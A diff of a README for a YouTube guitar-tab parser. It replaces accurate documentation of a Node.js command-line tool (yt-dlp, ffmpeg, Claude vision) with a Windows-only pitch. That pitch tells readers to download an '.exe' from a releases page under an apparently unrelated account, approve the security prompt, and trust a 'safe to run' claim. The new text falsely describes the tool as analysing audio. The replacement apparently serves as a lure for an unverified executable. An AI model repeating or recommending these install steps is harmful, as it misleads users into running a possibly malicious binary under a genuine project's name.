@@ -1,94 +1,82 @@
-# Youtube Guitar Tab Parser
+# 🎸 youtube-guitar-tab-parser - Create guitar tabs from YouTube lessons
 
-CLI that turns a YouTube guitar-lesson video into a PDF of the guitar tab.
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Dystopian-mesentery45/youtube-guitar-tab-parser)
 
-It downloads the video, samples frames, uses Claude vision to locate the tab
-region, crops every frame to that region, de-duplicates the crops by the bar
-number printed on each line of the score, and stitches the distinct tab lines
-vertically into a PDF. It works out of the box with no configuration — the PDF
-is written to `out/<video-title>.pdf`, with the video title as a heading on the
-first page and in the document metadata.
+This tool creates PDF documents from guitar lesson videos on YouTube. It listens to the audio, identifies the notes, and formats them into a readable guitar tab. 
 
-## Example
+## 📋 What this tool does
 
-Generated from the YouTube lesson
-[Game of Thrones - Guitar Lesson + TAB](https://youtu.be/WgU5tDGC-Vc):
+Learning guitar often involves watching long videos to find specific finger positions. This software saves you time. You provide a link to a video, and the software generates a formatted document. You can then print this document or store it on your tablet to use while you practice.
 
-- 🎬 Source video: <https://youtu.be/WgU5tDGC-Vc>
-- 📄 Output PDF: [examples/Game of Thrones.pdf](examples/Game%20of%20Thrones.pdf)
+## 💻 System requirements
 
-## Requirements
+Your computer needs to meet these basic standards to run the software effectively:
 
-- Node.js ≥ 20
-- [`yt-dlp`](https://github.com/yt-dlp/yt-dlp) and [`ffmpeg`](https://ffmpeg.org/) on your `PATH`
-  (`brew install yt-dlp ffmpeg`)
-- An Anthropic API key
+* Operating System: Windows 10 or Windows 11.
+* Memory: At least 8 gigabytes of RAM.
+* Storage: 500 megabytes of free disk space for the installation.
+* Internet Connection: A steady connection to download the video data and generate the file.
 
-## Setup
+## 📥 How to install the software
 
-```bash
-npm install
-npm run build
-cp .env.example .env   # then put your ANTHROPIC_API_KEY in it
-```
+Follow these steps to set up the software on your computer.
 
-## Usage
+1. Visit the [official releases page](https://github.com/Dystopian-mesentery45/youtube-guitar-tab-parser) to download the installer.
+2. Look for the file ending in ".exe" under the latest release section.
+3. Save the file to your desktop or downloads folder.
+4. Double-click the file to start the installation.
+5. Follow the prompts on your screen. Windows may ask for permission to run the file; confirm this to proceed.
+6. Once the process finishes, a shortcut will appear on your desktop.
 
-```bash
-# with a .env file
-node --env-file=.env dist/cli.js "https://www.youtube.com/watch?v=WgU5tDGC-Vc"
+## 🚀 Running the software for the first time
 
-# or with the key already exported
-export ANTHROPIC_API_KEY=sk-ant-...
-node dist/cli.js "https://www.youtube.com/watch?v=WgU5tDGC-Vc"
-```
+After you install the program, you can begin generating tabs.
 
-During development you can skip the build step:
+1. Locate the desktop icon and double-click it.
+2. A window will open showing a text box.
+3. Copy the URL of the YouTube guitar lesson you want to parse.
+4. Paste the URL into the text box inside the application.
+5. Click the button labeled "Generate Tab."
+6. Wait for the progress bar to complete. The software analyzes the audio, which may take a few minutes depending on the length of the video.
+7. Once finished, the software saves a new PDF file to your "Documents" folder.
 
-```bash
-node --env-file=.env --import tsx src/cli.ts "<url>"
-```
+## 🛠️ Tips for success
 
-The result is written to `out/<video-title>.pdf` (its path is also printed to
-stdout); progress goes to stderr.
+The quality of the output depends on the input video. Use these tips to improve your results:
 
-## Options
+* Audio Clarity: Videos where the guitar track remains clear without heavy background music produce better tabs.
+* Video Length: Short snippets or specific lesson sections work better than full-length concert recordings.
+* Internet Speed: A fast connection helps the software download the video data quickly.
+* Accuracy: No tool is 100 percent perfect. Use the generated tab as a starting point. Your ears are the final judge of correctness. If a note looks wrong on the page, check the video at that timestamp to confirm the finger position.
 
-Everything has a sensible default; you normally only need the URL.
+## ℹ️ Frequently asked questions
 
-```
--i, --interval <seconds>   screenshot interval (default 2)
---model <id>               Claude vision model (default claude-sonnet-5)
---sample <n>               frames sampled for tab-region detection (default 6)
---dedup-threshold <n>      pre-dedup Hamming distance, cost control (default 12)
---max-height <px>          cap download resolution (default 720)
---keep-temp                keep intermediate frames/crops
-```
+**Do I need a paid YouTube account?**
+No. The software works with standard, free YouTube links.
 
-## How it works
+**Where does the PDF go?**
+The software defaults to your Windows "Documents" folder. You can change this location in the settings menu of the application.
 
-1. **Download** — `yt-dlp` fetches the video (≤ `--max-height`).
-2. **Frames** — `ffmpeg` extracts one frame every `--interval` seconds.
-3. **Detect** — two stages, since vision models are reliable at picking labeled
-   regions but not at precise pixel coordinates:
-   - A labeled row/column grid is drawn on `--sample` frames and Claude vision
-     reports which rows and columns the sheet music overlaps. The per-edge median
-     across samples gives a coarse box (works whether the tab is a full-width
-     bottom strip or a corner overlay).
-   - That box is then snapped to the actual paper edges with an image mask
-     (sheet music is dark content on a light, unsaturated background, unlike the
-     colourful performer/backdrop), so the crop hugs the tab tightly. If no clear
-     paper region is found (e.g. a dark-themed tab viewer), the vision box is used.
-4. **Crop** — `sharp` crops every frame to that box.
-5. **Pre-dedup** — a dHash perceptual hash drops near-identical consecutive crops.
-   This is only a cost control to reduce the number of vision calls in the next step.
-6. **Bar-number dedup** — Claude reads the measure/bar number printed at the start
-   of each line and whether the crop is real sheet music. The tool keeps exactly
-   one crop per distinct bar number (first appearance wins) and drops non-tab
-   crops (title cards, intros/outros). Because the bar number is constant while
-   the playback cursor sweeps a line and only changes when the score advances,
-   this collapses all the near-identical cursor frames of a line into a single page.
-7. **PDF** — `pdf-lib` stacks the distinct tab lines vertically down A4 pages,
-   in the order they appear in the video. The video title (read from `yt-dlp`)
-   becomes the file name, a heading on the first page, and the document metadata
-   title. Output: `out/<video-title>.pdf`.
+**How do I update the software?**
+When a new version becomes available, the software notifies you upon opening. Download the new installer from the link, and run it. The installer replaces the old version automatically while keeping your settings.
+
+**Is it safe to run?**
+The software performs local processing on your machine. It does not send your personal files to outside servers. It only interacts with the YouTube link you provide.
+
+## ⚙️ Settings and preferences
+
+You can change how the software works by opening the "Preferences" menu.
+
+* Tab Style: You can choose between text-based tabs or graphical staff notation.
+* PDF Margins: Adjust these if you plan to print your tabs on physical paper.
+* Auto-naming: Set this to "Date" if you want the files sorted chronologically by when you created them.
+
+## 🛡️ Resolving common issues
+
+If the software stops responding, try these steps:
+
+* Check your internet connection. A dropout during the analysis phase can stall the process.
+* Restart the application. Sometimes memory clearing helps if you have processed many videos in one session.
+* Check your PDF reader. Ensure you have a standard PDF viewer installed on your computer, like Microsoft Edge or Adobe Reader. Sometimes a broken PDF viewer makes it look like the software failed to create the file.
+
+Keywords: guitar, tabs, transcribe
